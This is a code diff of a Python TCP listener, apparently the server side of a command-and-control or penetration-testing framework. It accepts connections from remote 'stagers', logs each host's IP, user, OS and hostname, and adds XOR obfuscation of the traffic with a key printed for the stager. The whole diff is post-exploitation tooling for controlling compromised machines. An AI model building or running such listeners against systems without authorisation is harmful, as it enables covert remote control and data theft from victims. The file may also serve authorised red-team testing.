@@ -9,19 +9,35 @@ from queue import Queue
 import json
 import signal
 
-global s
-id = 0
+letters = string.ascii_lowercase
 
 sockets = {}
+global s
+
+id = ''
+
 particles = {}
 th = []
 
 NR_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
-
 threads = {}
 
 q = Queue()
+
+global ENKEY
+
+#def str_xor(s1, s2):
+#    return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
+
+def str_xor(a, key):
+    cipherAscii = ""
+    keyLength = len(key)
+    for i in range(0, len(a)):
+        j = i % keyLength
+        xor = ord(a[i]) ^ ord(key[j])
+        cipherAscii = cipherAscii + chr(xor)
+    return cipherAscii
 
 def socket_create():
     global s
@@ -32,16 +48,29 @@ def socket_bind():
     s.bind((HOST, PORT))
     print(colored("[*] Binding to {}:{}".format(HOST,PORT), 'green'))
     s.listen(10000)
+    id = ''.join(random.choice(letters) for i in range(8))
+    while id in sockets:
+        id = ''.join(random.choice(letters) for i in range(8))
+
     sockets[id] = {}
     sockets[id]['queue'] = q
     sockets[id]['socket'] = s
     sockets[id]['addr'] = (str(s).split(",")[4]).split("'")[1] + ":" + (str(s).split(",")[5]).split(")")[0]
     sockets[id]['type'] = ((str(s).split(",")[2])).split(".")[1]
     sockets[id]['module'] = 'aws_python_tcp_listener'
-    id += 1
-    print(colored("[*] Socket created {}:{}\n".format(HOST, PORT), 'green'))
+    sockets[id]['ENKEY'] = ENKEY
 
+
+    #s2 = {}
+    #s2['addr'] = (str(s).split(",")[4]).split("'")[1] + ":" + (str(s).split(",")[5]).split(")")[0]
+    #s2['module'] = 'aws_python_tcp_listener'
+    #s2['ENKEY'] = ENKEY
+    #with open('./core/sockets/{}'.format(id), 'w') as sfile:
+    #    sfile.write(json.dumps(s2))
+    print(colored("[*] Socket created {}:{}\n".format(HOST, PORT), 'green'))
+    id = ''.join(random.choice(letters) for i in range(8))
 def socket_accept():
+    global ENKEY
     while True:
         global s, particles, WORKSPACE
         conn, addr = s.accept()
@@ -55,8 +84,12 @@ def socket_accept():
         #os.makedirs("../../../workspaces/{}".format(name))
         os.makedirs("./workspaces/{}/{}".format(WORKSPACE, name))
 
-        conn.send(str.encode(''))
-        info = conn.recv(2048).decode().strip("\n")
+        sentdt = str_xor("", ENKEY)
+        #conn.send(str.encode(sentdt))
+        thedata = recvall(conn).decode()
+        info = str_xor(thedata, ENKEY).strip()
+        #info = str_xor(i, ENKEY).strip("\n")
+        #info = str_xor(i, ENKEY)
 
         s.setblocking(True)
 
@@ -96,7 +129,8 @@ def socket_accept():
             "LAN_IP":addr[0],
             "User": user,
             "OS":system,
-            "Hostname":hostname
+            "Hostname":hostname,
+            "ENCKEY": ENKEY
         }
 
 #def register_signal_handler():
@@ -120,14 +154,20 @@ def quit_gracefully(signal=None, frame=None):
             sock.close()
     sys.exit(0)
 
-def recvall(conn, n):
+def recvall(s):
     data = b''
-    while len(data) < n:
-        packet = conn.recv(n - len(data))
-        if not packet:
-            return None
-        data += packet
-    return data
+    #bufferlength = 65500
+    bufferlength = 1048576
+    while True:
+        a = s.recv(bufferlength)
+        #if len(a) == 0:
+        if a.decode().strip()[-4:] == 'done':
+            data += a
+            print("Final Length: {}".format(str(len(data))))
+            return data[:-4]
+        else:
+            data += a
+            print("Length: {}".format(str(len(data))))
 
 def work():
     global sockets, WORKSPACE, s
@@ -192,7 +232,6 @@ def work():
             q.join()
             print(colored("[*] Socket Closed","yellow"))
             break
-    print("broke")
 
 def create_threads():
     #register_signal_handler()
@@ -208,16 +247,41 @@ def create_jobs():
         q.put(x)
     q.join()
 
-def main(host, port, workspace):
+def main(host, port, workspace, enc_key):
     global HOST
     global PORT
     global s
     global id
     global WORKSPACE
+    global ENKEY
+    '''if not enc_key == "":
+        ENKEY = enc_key
+    else:
+        
+    '''
 
     WORKSPACE = workspace
     HOST = host
     PORT = port
 
+    if enc_key == "":
+        ENKEY = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!$%&()=?[]+~#-_.:,<>|') for _ in range(1024))
+        print(
+            "{}:\n{}".format(
+                colored("XOR Encryption key auto-generated. Use the key below on the stager.", "yellow", attrs=['bold']),
+                colored(ENKEY, "green")
+            )
+        )
+    else:
+        ENKEY = enc_key
+        print(
+            "{}:\n{}".format(
+                colored("XOR Encryption key manually entered. Use the key below on the stager.", "yellow",
+                        attrs=['bold']),
+                colored(ENKEY, "green")
+            )
+        )
+    print(colored("-----------------------------------------------------------------------------------------------------------", "yellow"))
+    print("\n")
     create_threads()
     create_jobs()
